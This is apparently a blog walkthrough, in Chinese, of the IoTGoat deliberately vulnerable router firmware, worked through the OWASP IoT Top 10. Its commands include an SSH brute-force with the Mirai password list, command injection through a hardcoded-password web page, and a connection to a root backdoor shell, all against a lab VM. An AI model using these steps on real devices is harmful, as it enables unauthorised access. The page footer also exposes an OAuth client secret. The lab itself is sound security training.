<!DOCTYPE html>
<html lang="zh-CN">





<head>
  <meta charset="UTF-8">
  <link rel="apple-touch-icon" sizes="76x76" href="/img/avatar.png">
  <link rel="icon" type="image/png" href="/img/logo.png">
  <meta name="viewport"
        content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no, shrink-to-fit=no">
  <meta http-equiv="x-ua-compatible" content="ie=edge">
  
  <meta name="theme-color" content="#2f4154">
  <meta name="description" content="">
  <meta name="author" content="Mr.BelieVe">
  <meta name="keywords" content="">
  <title>IoTGoat - Mr.BelieVe&#39;s Treasure</title>

  <link  rel="stylesheet" href="https://cdn.staticfile.org/font-awesome/5.12.1/css/all.min.css" />
<link  rel="stylesheet" href="https://cdn.staticfile.org/twitter-bootstrap/4.4.1/css/bootstrap.min.css" />
<link  rel="stylesheet" href="https://cdn.staticfile.org/mdbootstrap/4.13.0/css/mdb.min.css" />
<link  rel="stylesheet" href="https://cdn.staticfile.org/github-markdown-css/3.0.1/github-markdown.min.css" />

<link rel="stylesheet" href="//at.alicdn.com/t/font_1067060_qzomjdt8bmp.css">



  <link  rel="stylesheet" href="/lib/prettify/tomorrow-night-eighties.min.css" />

<link  rel="stylesheet" href="/css/main.css" />


  <link defer rel="stylesheet" href="https://cdn.staticfile.org/fancybox/3.5.7/jquery.fancybox.min.css" />


<!-- 自定义样式保持在最底部 -->


<meta name="generator" content="Hexo 4.2.0"></head>


<body>
  <header style="height: 70vh;">
    <nav id="navbar" class="navbar fixed-top  navbar-expand-lg navbar-dark scrolling-navbar">
  <div class="container">
    <a class="navbar-brand"
       href="/">&nbsp;<strong>Mr.BelieVe's Treasure</strong>&nbsp;</a>

    <button id="navbar-toggler-btn" class="navbar-toggler" type="button" data-toggle="collapse"
            data-target="#navbarSupportedContent"
            aria-controls="navbarSupportedContent" aria-expanded="false" aria-label="Toggle navigation">
      <div class="animated-icon"><span></span><span></span><span></span></div>
    </button>

    <!-- Collapsible content -->
    <div class="collapse navbar-collapse" id="navbarSupportedContent">
      <ul class="navbar-nav ml-auto text-center">
        
          
          
          
          
          <li class="nav-item">
            <a class="nav-link" href="/">首页</a>
          </li>
        
          
          
          
          
          <li class="nav-item">
            <a class="nav-link" href="/archives/">归档</a>
          </li>
        
          
          
          
          
          <li class="nav-item">
            <a class="nav-link" href="/categories/">分类</a>
          </li>
        
          
          
          
          
          <li class="nav-item">
            <a class="nav-link" href="/tags/">标签</a>
          </li>
        
          
          
          
          
          <li class="nav-item">
            <a class="nav-link" href="/about/">关于</a>
          </li>
        
          
          
          
          
          <li class="nav-item">
            <a class="nav-link" href="/links/">友链</a>
          </li>
        
        
          <li class="nav-item" id="search-btn">
            <a class="nav-link" data-toggle="modal" data-target="#modalSearch">&nbsp;&nbsp;<i
                class="iconfont icon-search"></i>&nbsp;&nbsp;</a>
          </li>
        
      </ul>
    </div>
  </div>
</nav>

    <div class="view intro-2" id="background" parallax=true
         style="background: url('/img/default.png') no-repeat center center;
           background-size: cover;">
      <div class="full-bg-img">
        <div class="mask rgba-black-light flex-center">
          <div class="container text-center white-text fadeInUp">
            <span class="h2" id="subtitle">
              
            </span>

            
              
                <p class="mt-3 post-meta">
                  <i class="fas fa-calendar-alt" aria-hidden="true"></i>
                  星期二, 十一月 3日 2020, 7:50 晚上
                </p>
              

              <p class="mt-1">
                
                  
                  <span class="post-meta">
                    <i class="far fa-chart-bar"></i>
                    2.2k 字
                  </span>
                

                
                  
                  <span class="post-meta">
                      <i class="far fa-clock"></i>
                      12 分钟
                  </span>
                

                
              </p>
            
          </div>

          
        </div>
      </div>
    </div>
  </header>

  <main>
    
      

<div class="container-fluid">
  <div class="row">
    <div class="d-none d-lg-block col-lg-2"></div>
    <div class="col-lg-8 nopadding-md">
      <div class="container nopadding-md" id="board-ctn">
        <div class="py-5 z-depth-3" id="board">
          <div class="post-content mx-auto" id="post">
            
            <div class="markdown-body">
              <h1 id="IoTGoat"><a href="#IoTGoat" class="headerlink" title="IoTGoat"></a>IoTGoat</h1><h2 id="No-1-Weak-Guessable-or-Hardcoded-Passwords"><a href="#No-1-Weak-Guessable-or-Hardcoded-Passwords" class="headerlink" title="No 1: Weak, Guessable, or Hardcoded Passwords:"></a>No 1: Weak, Guessable, or Hardcoded Passwords:</h2><pre><code>$ find . -name cgi-bin
./www/cgi-bin</code></pre><p>查找，<a href="https://github.com/craigz28/firmwalker" target="_blank" rel="noopener">firmwalker</a></p>
<blockquote>
<p>It will search through the extracted or mounted firmware file system for things of interest such as:</p>
<ul>
<li>etc/shadow and etc/passwd</li>
<li>list out the etc/ssl directory</li>
<li>search for SSL related files such as .pem, .crt, etc.</li>
<li>search for configuration files</li>
<li>look for script files</li>
<li>search for other .bin files</li>
<li>look for keywords such as admin, password, remote, etc.</li>
<li>search for common web servers used on IoT devices</li>
<li>search for common binaries such as ssh, tftp, dropbear, etc.</li>
<li>search for URLs, email addresses and IP addresses</li>
<li>Experimental support for making calls to the Shodan API using the Shodan CLI</li>
</ul>
</blockquote>
<pre><code>$ ./firmwalker.sh ../firmware/_IoTGoat-x86.img.extracted/squashfs-root/ ./IoTGoat.txt</code></pre><blockquote>
<p><strong>/etc/shadow</strong><br>保存了加密的真实密码</p>
<pre><code>root:$1$Jl7H1VOG$Wgw2F/C.nLNTC.4pwDa4H1:
|                |
1                2</code></pre><ol>
<li><p><strong>Username</strong> : It is your login name.</p>
</li>
<li><p><strong>Password</strong>: It is your encrypted password. The password should be minimum 8-12 characters long including special characters, digits, lower case alphabetic and more. Usually password format is set to</p>
<p><code>$id$salt$hashed</code>, The<code>$id</code>is the algorithm used On GNU/Linux as follows:</p>
<ol>
<li><code>$1$</code> is MD5</li>
<li><code>$2a$</code> is Blowfish</li>
<li><code>$2y$</code>is Blowfish</li>
<li><code>$5$</code> is SHA-256</li>
<li><code>$6$</code>is SHA-512</li>
</ol>
<p><a href="https://www.cyberciti.biz/faq/understanding-etcshadow-file/" target="_blank" rel="noopener">more</a></p>
</li>
</ol>
</blockquote>
<p>爆破密码</p>
<pre><code>$ john --show ./etc/shadow
0 password hashes cracked, 2 left</code></pre><p>hashcat也可以解密md5等，很强大但是我不大会用。。</p>
<p>medusa</p>
<blockquote>
<p>Hydra, Medusa, or Ncrack都可以用来爆破</p>
</blockquote>
<p>加上使用<a href="https://github.com/danielmiessler/SecLists" target="_blank" rel="noopener">SecList</a></p>
<blockquote>
<p>SecLists is the security tester’s companion. It’s a collection of multiple types of lists used during security assessments, collected in one place. List types include usernames, passwords, URLs, sensitive data patterns, fuzzing payloads, web shells, and many more. </p>
</blockquote>
<p>使用命令<code>awk &#39;{print $2}&#39; SecLists/Passwords/Malware/mirai-botnet.txt &gt; SecLists/Passwords/Malware/mirai-botnet_passwords.txt</code>来把密码部分导出到一个文件里</p>
<p>然后</p>
<pre><code>$ medusa -u iotgoatuser -P ./SecLists/Passwords/Malware/mirai-botnet_passwords.txt -h 192.168.56.101 -M ssh</code></pre><p>即可爆破到ssh的密码<code>7ujMko0vizxv</code></p>
<h2 id="No-2-Insecure-Network-Services"><a href="#No-2-Insecure-Network-Services" class="headerlink" title="No 2: Insecure Network Services:"></a>No 2: Insecure Network Services:</h2><pre><code class="sh">kali@kali:~/Desktop/IoTGoat$ nmap -p20-6000 192.168.56.101
Starting Nmap 7.80 ( https://nmap.org ) at 2020-11-09 02:45 EST
Nmap scan report for 192.168.56.101 (192.168.56.101)
Host is up (0.0026s latency).
Not shown: 5973 filtered ports
PORT     STATE SERVICE
22/tcp   open  ssh
25/tcp   open  smtp
53/tcp   open  domain                
80/tcp   open  http                                       110/tcp  open  pop3
443/tcp  open  https                                       5000/tcp open  upnp                                       5515/tcp open  unknown</code></pre>
<pre><code>ali@kali:~/Desktop/IoTGoat$ sudo nmap -sU -p20-6000 192.168.56.101 &gt; ScanUdpResult.txt                         kali@kali:~/Desktop/IoTGoat$ cat ScanUdpResult.txt 
Starting Nmap 7.80 ( https://nmap.org ) at 2020-11-09 03:20 EST                                                 Nmap scan report for 192.168.56.101 (192.168.56.101)       Host is up (0.00058s latency).                             Not shown: 5980 open|filtered ports                      PORT   STATE SERVICE                                       53/udp open  domain                                       Nmap done: 1 IP address (1 host up) scanned in 16.01 seconds  </code></pre><p>但是我的upnp好像不起作用，只能贴wp了</p>
<blockquote>
<pre><code>nmap -p5000 -sV 172.16.100.213
Starting Nmap 7.80 ( https://nmap.org ) at 2020-05-04 23:10 EDT
Nmap scan report for IoTGoat (172.16.100.213)
Host is up (0.00045s latency).

PORT     STATE SERVICE VERSION
5000/tcp open  upnp    MiniUPnP 2.1 (UPnP 1.1)
1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
SF-Port5000-TCP:V=7.80%I=7%D=5/4%Time=5EB0D91A%P=x86_64-pc-linux-gnu%r(Gen
SF:ericLines,124,&quot;\x20501\x20Not\x20Implemented\r\nContent-Type:\x20text/h
SF:tml\r\nConnection:\x20close\r\nContent-Length:\x20149\r\nServer:\x20Ope
SF:nWRT/18\.06\.2\x20UPnP/1\.1\x20MiniUPnPd/2\.1\r\nExt:\r\n\r\n&lt;HTML&gt;&lt;HEA
SF:D&gt;&lt;TITLE&gt;501\x20Not\x20Implemented&lt;/TITLE&gt;&lt;/HEAD&gt;&lt;BODY&gt;&lt;H1&gt;Not\x20Imple
SF:mented&lt;/H1&gt;The\x20HTTP\x20Method\x20is\x20not\x20implemented\x20by\x20t
SF:his\x20server\.&lt;/BODY&gt;&lt;/HTML&gt;\r\n&quot;)%r(GetRequest,117,&quot;HTTP/1\.0\x20404\
SF:x20Not\x20Found\r\nContent-Type:\x20text/html\r\nConnection:\x20close\r
SF:\nContent-Length:\x20134\r\nServer:\x20OpenWRT/18\.06\.2\x20UPnP/1\.1\x
SF:20MiniUPnPd/2\.1\r\n
[SNIP]
&lt;/TITLE&gt;&lt;/HEAD&gt;&lt;BODY&gt;&lt;H1&gt;Not\x20Implemented&lt;
SF:/H1&gt;The\x20HTTP\x20Method\x20is\x20not\x20implemented\x20by\x20this\x20
SF:server\.&lt;/BODY&gt;&lt;/HTML&gt;\r\n&quot;);
MAC Address: 00:0C:29:00:AC:E7</code></pre><p>Analyze the service detection response details and note information such as the service version (<code>MiniUPnP 2.1</code>), server version (<code>OpenWrt 18.06.2</code>), as well as the error code details. Proceed with interrogating each listening services with aggressive scripts that aid in vulnerability identification based on service versioning. Try searching for appropriate <code>nmap scripts</code> in Kali Linux under <code>/usr/share/nmap/scripts</code> directory. A <code>upnp</code> example using <code>broadcast-upnp-info</code> script is shown below.</p>
<pre><code>nmap -sV --script=broadcast-upnp-info 172.16.100.213
Starting Nmap 7.80 ( https://nmap.org ) at 2020-05-04 23:39 EDT
Pre-scan script results:
| broadcast-upnp-info: 
|   239.255.255.250
|       Server: OpenWRT/18.06.2 UPnP/1.1 MiniUPnPd/2.1
|       Location: http://192.168.50.143:5000/rootDesc.xml
|         Webserver: OpenWRT/18.06.2 UPnP/1.1 MiniUPnPd/2.1
|         Name: OpenWRT router
|         Manufacturer: OpenWRT
|         Model Descr: OpenWRT router
|         Model Name: OpenWRT router
|         Model Version: 1
|         Name: WANDevice
|         Manufacturer: MiniUPnP
|         Model Descr: WAN Device
|         Model Name: WAN Device
|         Model Version: 20190130
|         Name: WANConnectionDevice
|         Manufacturer: MiniUPnP
|         Model Descr: MiniUPnP daemon
|         Model Name: MiniUPnPd
|_        Model Version: 20190130
[SNIP]
Nmap scan report for IoTGoat (192.168.50.143)
Host is up (0.00045s latency).
Not shown: 995 closed ports
PORT     STATE SERVICE  VERSION
22/tcp   open  ssh      Dropbear sshd (protocol 2.0)
53/tcp   open  domain   dnsmasq 2.73
80/tcp   open  http     LuCI Lua http config
443/tcp  open  ssl/http LuCI Lua http config
5000/tcp open  upnp     MiniUPnP 2.1 (UPnP 1.1)
| fingerprint-strings: 
|   FourOhFourRequest, GetRequest: 
|     HTTP/1.0 404 Not Found
|     Content-Type: text/html
|     Connection: close
|     Content-Length: 134
|     Server: OpenWRT/18.06.2 UPnP/1.1 MiniUPnPd/2.1
|     Ext:
|     &lt;HTML&gt;&lt;HEAD&gt;&lt;TITLE&gt;404 Not Found&lt;/TITLE&gt;&lt;/HEAD&gt;&lt;BODY&gt;&lt;H1&gt;Not Found&lt;/H1&gt;The requested URL was not found on this server.&lt;/BODY&gt;&lt;/HTML&gt;
|   GenericLines: 
|     501 Not Implemented
|     Content-Type: text/html
|     Connection: close
|     Content-Length: 149
|     Server: OpenWRT/18.06.2 UPnP/1.1 MiniUPnPd/2.1
|     Ext:
|     &lt;HTML&gt;&lt;HEAD&gt;&lt;TITLE&gt;501 Not Implemented&lt;/TITLE&gt;&lt;/HEAD&gt;&lt;BODY&gt;&lt;H1&gt;Not Implemented&lt;/H1&gt;The HTTP Method is not implemented by this server.&lt;/BODY&gt;&lt;/HTML&gt;
|   HTTPOptions: 
[SNIP] </code></pre></blockquote>
<h2 id="No-3-Insecure-Ecosystem-Interfaces"><a href="#No-3-Insecure-Ecosystem-Interfaces" class="headerlink" title="No 3: Insecure Ecosystem Interfaces:"></a>No 3: Insecure Ecosystem Interfaces:</h2><h3 id="隐藏的web-shell"><a href="#隐藏的web-shell" class="headerlink" title="隐藏的web shell"></a>隐藏的web shell</h3><p>在web服务器config文件<code>./etc/config/uhttpd</code>可以看到<code>lua_prefix</code></p>
<pre><code>kali@kali:~/Desktop/IoTGoat/_IoTGoat-x86.img.extracted/squashfs-root$ cat ./etc/config/uhttpd | grep &quot;/&quot;
        option home             /www
        option cert             /etc/uhttpd.crt
        option key              /etc/uhttpd.key
        # Default is /cgi-bin
        option cgi_prefix       /cgi-bin
#       list interpreter        &quot;.php=/usr/bin/php-cgi&quot;
#       list interpreter        &quot;.cgi=/usr/bin/perl&quot;
        list lua_prefix         &quot;/cgi-bin/luci=/usr/lib/lua/luci/sgi/uhttpd.lua&quot;</code></pre><p>这个lua_prefix是用来跳转到对应文件的，可参考<a href="https://blog.csdn.net/qq_26202991/article/details/102621184" target="_blank" rel="noopener">这里</a></p>
<p>然后在<code>./usr/lib/lua/luci/</code>可以看见</p>
<pre><code>├───cbi
├───controller
│   ├───admin
│   └───iotgoat
│   ├───cbi
│   │   ├───admin_network
│   │   ├───admin_status
│   │   ├───admin_system
│   │   │   └───fstab
│   │   ├───firewall
│   │   └───upnp
│   └───network
├───sgi
├───sys
│   └───zoneinfo
├───template
├───tools
    ├───admin_network
    │   └───index
    ├───admin_system
    ├───admin_uci
    ├───cbi
    ├───firewall
    ├───iotgoat
        └───bootstrap</code></pre><p>在<code>controller/iotgoat/iotgoat.lua</code>中可以看到index函数</p>
<pre><code class="lua">function index()
    entry({&quot;admin&quot;, &quot;iotgoat&quot;}, firstchild(), &quot;IoTGoat&quot;, 60).dependent=false
    entry({&quot;admin&quot;, &quot;iotgoat&quot;, &quot;cmdinject&quot;}, template(&quot;iotgoat/cmd&quot;), &quot;&quot;, 1)
    entry({&quot;admin&quot;, &quot;iotgoat&quot;, &quot;cam&quot;}, template(&quot;iotgoat/camera&quot;), &quot;Camera&quot;, 2)
    entry({&quot;admin&quot;, &quot;iotgoat&quot;, &quot;door&quot;}, template(&quot;iotgoat/door&quot;), &quot;Doorlock&quot;, 3)
    entry({&quot;admin&quot;, &quot;iotgoat&quot;, &quot;webcmd&quot;}, call(&quot;webcmd&quot;))
end</code></pre>
<p>在<code>view/iotgoat/</code>里有<code>cmd.html</code></p>
<p>所以访问<code>https://&lt;IoTGoat_IP&gt;/cgi-bin/luci/admin/iotgoat/cmdinject</code>即可</p>
<p>需要登陆密码，<code>iotgoathardcodedpassword</code></p>
<p>在cmd中输入<code>telnet -p 9999</code>，linux nc即可连入</p>
<blockquote>
<p>更多有关luci可以参考</p>
<p><a href="https://www.cnblogs.com/x_wukong/p/4505240.html" target="_blank" rel="noopener">luci框架-LUA的一个web框架使用</a></p>
<p><a href="https://github.com/openwrt/luci/wiki" target="_blank" rel="noopener">openwrt luci的wiki</a></p>
</blockquote>
<h3 id="后门"><a href="#后门" class="headerlink" title="后门"></a>后门</h3><p>前面有个5515端口是未知的，nc连一下居然是后门。。</p>
<pre><code>nc 192.168.56.102 5515
[***]Successfully Connected to IoTGoat&#39;s Backdoor[***]

ls
bin
boot
dev
dnsmasq_setup.sh
etc
lib
mnt
overlay
proc
rom
root
sbin
sys
tmp
usr
var
www

id
uid=0(root) gid=0(root)</code></pre><h3 id="XSS"><a href="#XSS" class="headerlink" title="XSS"></a>XSS</h3><p>Network/Firewall/Traffic Rules里</p>
<p>New forward rule 、 New source NAT 的Name 有XSS</p>
<blockquote>
<p>快速了解：<a href="https://zhuanlan.zhihu.com/p/26177815" target="_blank" rel="noopener">浅谈XSS攻击的那些事（附常用绕过姿势）</a></p>
</blockquote>
<h2 id="No-4-Lack-of-Secure-Update-Mechanism"><a href="#No-4-Lack-of-Secure-Update-Mechanism" class="headerlink" title="No 4: Lack of Secure Update Mechanism:"></a>No 4: Lack of Secure Update Mechanism:</h2><h3 id="Insecure-package-update-configuration-defaults-including-CVE-2020-7982"><a href="#Insecure-package-update-configuration-defaults-including-CVE-2020-7982" class="headerlink" title="Insecure package update configuration defaults including CVE-2020-7982."></a>Insecure package update configuration defaults including CVE-2020-7982.</h3><p><a href="https://www.anquanke.com/post/id/202039" target="_blank" rel="noopener">OPENWRT中的远程命令执行漏洞（CVE-2020-7982）[CN]</a></p>
<h2 id="No-5-Use-of-Insecure-or-Outdated-Components"><a href="#No-5-Use-of-Insecure-or-Outdated-Components" class="headerlink" title="No 5: Use of Insecure or Outdated Components:"></a>No 5: Use of Insecure or Outdated Components:</h2><h3 id="Several-insecure-and-outdated-software-components-with-CVEs-such-as-Dnsmasq-pppd-Linux-Kernel-BusyBox-wpa-supplicant-and-more"><a href="#Several-insecure-and-outdated-software-components-with-CVEs-such-as-Dnsmasq-pppd-Linux-Kernel-BusyBox-wpa-supplicant-and-more" class="headerlink" title="Several insecure and outdated software components with CVEs such as Dnsmasq, pppd, Linux Kernel, BusyBox, wpa_supplicant, and more."></a>Several insecure and outdated software components with CVEs such as Dnsmasq, pppd, Linux Kernel, BusyBox, wpa_supplicant, and more.</h3><p>Todo: auto scan</p>
<p>TLS 1.2</p>
<p>ssh 2.0</p>
<p>pppd 2.4.7</p>
<p>Dnsmasq 2.73</p>
<p>wpa_supplicant v2.7-devel</p>
<p>BusyBox v1.28.4</p>
<h2 id="No-6-Insufficient-Privacy-Protection"><a href="#No-6-Insufficient-Privacy-Protection" class="headerlink" title="No 6: Insufficient Privacy Protection:"></a>No 6: Insufficient Privacy Protection:</h2><h3 id="PII-data-captured-and-stored-insecurely"><a href="#PII-data-captured-and-stored-insecurely" class="headerlink" title="PII data captured and stored insecurely."></a>PII data captured and stored insecurely.</h3><p>Personally identifiable information (PII)</p>
<p>firmwalker搜索的db文件</p>
<pre><code>##################################### *.db
/usr/lib/lua/luci/controller/iotgoat/sensordata.db</code></pre><p>然后使用sqlite3</p>
<pre><code>kali@kali:~/Desktop/IoTGoat/_IoTGoat-x86.img.extracted/squashfs-root/usr/lib/lua/luci/controller/iotgoat$ sqlite3 sensordata.db 
SQLite version 3.32.3 2020-06-18 14:00:33
Enter &quot;.help&quot; for usage hints.
sqlite&gt; .dump
PRAGMA foreign_keys=OFF;
BEGIN TRANSACTION;
CREATE TABLE sensors(id INTEGER PRIMARY KEY AUTOINCREMENT, temperature NUMERIC, humidity NUMERIC, currentdate DATE, currentime TIME, name TEXT, email TEXT, birthdate NUMERIC);
INSERT INTO sensors VALUES(1,22.399999999999998579,68,&#39;2020-03-24&#39;,&#39;18:56:33&#39;,&#39;johnsmith&#39;,&#39;johnsmith@gmail.com&#39;,1311977);
INSERT INTO sensors VALUES(2,29.699999999999999289,98,&#39;2020-03-24&#39;,&#39;18:56:43&#39;,&#39;jillsmith&#39;,&#39;jillsmith@gmail.com&#39;,4141979);
INSERT INTO sensors VALUES(3,31.199999999999999289,28,&#39;2020-03-24&#39;,&#39;18:57:05&#39;,&#39;walter&#39;,&#39;waltergary@yopmail.com&#39;,32821969);
INSERT INTO sensors VALUES(4,16.899999999999998578,38,&#39;2020-03-24&#39;,&#39;18:57:20&#39;,&#39;WilliamRonald&#39;,&#39;billronald@yopmail.com&#39;,11141989);
INSERT INTO sensors VALUES(5,35,78,&#39;2020-03-24&#39;,&#39;18:58:04&#39;,&#39;Test&#39;,&#39;TstUser@aol.com&#39;,12121990);
INSERT INTO sensors VALUES(6,35,88,&#39;2020-03-24&#39;,&#39;18:58:18&#39;,&#39;Sgt&#39;,&#39;sgtmajor@us.gov&#39;,10171956);
DELETE FROM sqlite_sequence;
INSERT INTO sqlite_sequence VALUES(&#39;sensors&#39;,6);
COMMIT;
sqlite&gt; 
</code></pre><h2 id="No-7-Insecure-Data-Transfer-and-Storage"><a href="#No-7-Insecure-Data-Transfer-and-Storage" class="headerlink" title="No 7: Insecure Data Transfer and Storage:"></a>No 7: Insecure Data Transfer and Storage:</h2><p><code>&lt;IP&gt;/cgi-bin/luci/admin/network/wireless/wl0.network1</code></p>
<p>wifi没有密码</p>
<h2 id="No-8-Lack-of-Device-Management"><a href="#No-8-Lack-of-Device-Management" class="headerlink" title="No 8: Lack of Device Management:"></a>No 8: Lack of Device Management:</h2><p><code>&lt;IP&gt;/cgi-bin/luci/admin/status/syslog</code>没有开启</p>
<h2 id="No-9-Insecure-Default-Settings"><a href="#No-9-Insecure-Default-Settings" class="headerlink" title="No 9: Insecure Default Settings:"></a>No 9: Insecure Default Settings:</h2><h3 id="Many-included-in-IoTGoat-such-as-missing-secure-headers-to-prevent-framing-as-well-as-CSRF-protections-on-sensitive-requests"><a href="#Many-included-in-IoTGoat-such-as-missing-secure-headers-to-prevent-framing-as-well-as-CSRF-protections-on-sensitive-requests" class="headerlink" title="Many included in IoTGoat such as missing secure headers to prevent framing as well as CSRF protections on sensitive requests."></a>Many included in IoTGoat such as missing secure headers to prevent framing as well as CSRF protections on sensitive requests.</h3><blockquote>
<p>检测CSRF漏洞是一项比较繁琐的工作，最简单的方法就是抓取一个正常请求的数据包，去掉Referer字段后再重新提交，如果该提交还有效，那么基本上可以确定存在CSRF漏洞。</p>
<p>​    目前防御 CSRF 攻击主要有三种策略：验证 HTTP Referer 字段；在请求地址中添加 token 并验证；在 HTTP 头中自定义属性并验证。</p>
<p><a href="https://blog.csdn.net/xiaoxinshuaiga/article/details/80766369" target="_blank" rel="noopener">link</a></p>
</blockquote>
<h2 id="No-10-Lack-of-Physical-Hardening"><a href="#No-10-Lack-of-Physical-Hardening" class="headerlink" title="No 10: Lack of Physical Hardening:"></a>No 10: Lack of Physical Hardening:</h2><p>物理强化，应该是指对固件的保护</p>

            </div>
            <hr>
            <div>
              <p>
                
                
              </p>
              
                <p class="note note-warning">本博客所有文章除特别声明外，均采用 <a href="https://zh.wikipedia.org/wiki/Wikipedia:CC_BY-SA_3.0%E5%8D%8F%E8%AE%AE%E6%96%87%E6%9C%AC" target="_blank" rel="nofollow noopener noopener">CC BY-SA 3.0协议</a> 。转载请注明出处！</p>
              
              
                <div class="post-prevnext row">
                  <div class="post-prev col-6">
                    
                    
                      <a href="/2021/01/24/%E7%AC%94%E8%AE%B0%E7%AE%A1%E7%90%86%E5%8D%87%E7%BA%A7/">
                        <i class="fa fa-chevron-left"></i>
                        <span class="hidden-mobile">笔记管理升级</span>
                        <span class="visible-mobile">上一篇</span>
                      </a>
                    
                  </div>
                  <div class="post-next col-6">
                    
                    
                      <a href="/2020/10/19/Netgear%20Nighthawk%20R8300%20upnpd%20PreAuth%20RCE%20%E5%A4%8D%E7%8E%B0%E8%BE%85%E5%8A%A9/">
                        <span class="hidden-mobile">Netgear Nighthawk R8300 upnpd PreAuth RCE 复现辅助</span>
                        <span class="visible-mobile">下一篇</span>
                        <i class="fa fa-chevron-right"></i>
                      </a>
                    
                  </div>
                </div>
              
            </div>

              
                <!-- Comments -->
                <div class="comments" id="comments">
                  
                  
  <div id="gitalk-container"></div>
  <link rel="stylesheet" href="https://unpkg.com/gitalk/dist/gitalk.css">
  <script defer src="https://unpkg.com/gitalk/dist/gitalk.min.js"></script>
  <script defer src="https://cdn.jsdelivr.net/npm/blueimp-md5@2.11.1/js/md5.min.js"></script>
  <script type="text/javascript">
    var oldLoad = window.onload;
    window.onload = function () {
      var gitalk = new Gitalk({
        clientID: 'c16704b33f7cc977ea90',
        clientSecret: '9f8ad5600be82be115466ef0daf0f8a24a7b2da1',
        repo: 'mrbelieve128.github.io',
        owner: 'mrbelieve128',
        admin: 'mrbelieve128',
        id: md5(location.pathname),
        language: 'zh-CN',
        perPage: 15,
        pagerDirection: 'last',
        createIssueManually: 'false',
        distractionFreeMode: 'false'
      });

      gitalk.render('gitalk-container')
      oldLoad && oldLoad();
    }
  </script>


                </div>
              
          </div>
        </div>
      </div>
    </div>
    
      <div class="d-none d-lg-block col-lg-2 toc-container" id="toc-ctn">
        <div id="toc-start"></div>
<div id="toc">
  <p class="h5"><i class="far fa-list-alt"></i>&nbsp;目录</p>
  <div id="tocbot"></div>
</div>

      </div>
    
  </div>
</div>

<!-- Custom -->


    
  </main>

  
    <a class="z-depth-1" id="scroll-top-button" href="#" role="button">
      <i class="fa fa-chevron-up scroll-top-arrow" aria-hidden="true"></i>
    </a>
  

  
    <div class="modal fade" id="modalSearch" tabindex="-1" role="dialog" aria-labelledby="ModalLabel"
     aria-hidden="true">
  <div class="modal-dialog modal-dialog-scrollable modal-lg" role="document">
    <div class="modal-content">
      <div class="modal-header text-center">
        <h4 class="modal-title w-100 font-weight-bold">搜索</h4>
        <button type="button" id="local-search-close" class="close" data-dismiss="modal" aria-label="Close">
          <span aria-hidden="true">&times;</span>
        </button>
      </div>
      <div class="modal-body mx-3">
        <div class="md-form mb-5">
          <input type="text" id="local-search-input" class="form-control validate">
          <label data-error="x" data-success="v"
                 for="local-search-input">关键词</label>
        </div>
        <div class="list-group" id="local-search-result"></div>
      </div>
    </div>
  </div>
</div>
  

  

  

  <footer class="mt-5">
  <div class="text-center py-3">
    <div>
      <a href="https://hexo.io" target="_blank" rel="nofollow noopener"><b>Hexo</b></a>
      <i class="iconfont icon-love"></i>
      <a href="https://github.com/fluid-dev/hexo-theme-fluid" target="_blank" rel="nofollow noopener"> <b>Fluid</b></a>
    </div>
    
  <div>
    
      <!-- 不蒜子统计PV -->
      
      <span id="busuanzi_container_site_pv" style="display: none">
      总访问量 <span id="busuanzi_value_site_pv"></span> 次
    </span>
    
    
      <!-- 不蒜子统计UV -->
      
      <span id="busuanzi_container_site_uv" style="display: none">
      总访客数 <span id="busuanzi_value_site_uv"></span> 人
    </span>
    
  </div>


    
  <!-- 备案信息 -->
  <div>
    <a href="http://beian.miit.gov.cn/" target="_blank"
       rel="nofollow noopener">浙ICP备19033044号</a>
    


    
  </div>
</footer>

<!-- SCRIPTS -->
<script  src="https://cdn.staticfile.org/jquery/3.4.1/jquery.min.js" ></script>
<script  src="https://cdn.staticfile.org/popper.js/1.16.1/umd/popper.min.js" ></script>
<script  src="https://cdn.staticfile.org/twitter-bootstrap/4.4.1/js/bootstrap.min.js" ></script>
<script  src="https://cdn.staticfile.org/mdbootstrap/4.13.0/js/mdb.min.js" ></script>
<script  src="/js/main.js" ></script>


  <script  src="/js/lazyload.js" ></script>



  
  <script  src="https://cdn.staticfile.org/tocbot/4.10.0/tocbot.min.js" ></script>
  <script>
    $(document).ready(function () {
      var navHeight = $('#navbar').height();
      var toc = $('#toc');
      var boardCtn = $('#board-ctn');
      var boardTop = boardCtn.offset().top;
      var tocLimMax = 2 * boardTop + boardCtn.height();

      $(window).scroll(function () {
        var tocLimMin = $('#toc-start').offset().top - navHeight;
        var scroH = document.body.scrollTop + document.documentElement.scrollTop;

        if (tocLimMin <= scroH && scroH <= tocLimMax) {
          toc.css({
            'display': 'block',
            'position': 'fixed',
            'top': navHeight,
          });
        } else if (scroH <= tocLimMin) {
          toc.css({
            'position': '',
            'top': '',
          });
        } else if (scroH > tocLimMax) {
          toc.css('display', 'none');
        }
      });
      tocbot.init({
        tocSelector: '#tocbot',
        contentSelector: '.post-content',
        headingSelector: 'h1,h2,h3,h4,h5,h6',
        linkClass: 'tocbot-link',
        activeLinkClass: 'tocbot-active-link',
        listClass: 'tocbot-list',
        isCollapsedClass: 'tocbot-is-collapsed',
        collapsibleClass: 'tocbot-is-collapsible',
        scrollSmooth: true,
        headingsOffset: -boardTop
      });
      if ($('.toc-list-item').length > 0) {
        $('#toc > p').css('visibility', 'visible');
      }
      var offset = boardCtn.css('margin-right')
      $('#toc-ctn').css({
        'right': offset
      })
    });
  </script>





  <script defer src="https://cdn.staticfile.org/clipboard.js/2.0.6/clipboard.min.js" ></script>
  <script  src="/js/clipboard-use.js" ></script>



  <script defer src="https://cdn.staticfile.org/smoothscroll/1.4.10/SmoothScroll.min.js" ></script>



  <script defer src="https://busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js" ></script>




<!-- Plugins -->



  <script  src="https://cdn.staticfile.org/prettify/188.0.0/prettify.min.js" ></script>
  <script>
    $(document).ready(function () {
      $('pre').addClass('prettyprint  linenums');
      prettyPrint();
    })
  </script>



  <script  src="https://cdn.staticfile.org/typed.js/2.0.11/typed.min.js" ></script>
  <script>
    var typed = new Typed('#subtitle', {
      strings: [
        '  ',
        "IoTGoat&nbsp;",
      ],
      cursorChar: "_",
      typeSpeed: 70,
      loop: false,
    });
    typed.stop();
    $(document).ready(function () {
      $(".typed-cursor").addClass("h2");
      typed.start();
    });
  </script>



  <script  src="https://cdn.staticfile.org/anchor-js/4.2.2/anchor.min.js" ></script>
  <script>
    anchors.options = {
      placement: "right",
      visible: "hover",
      
    };
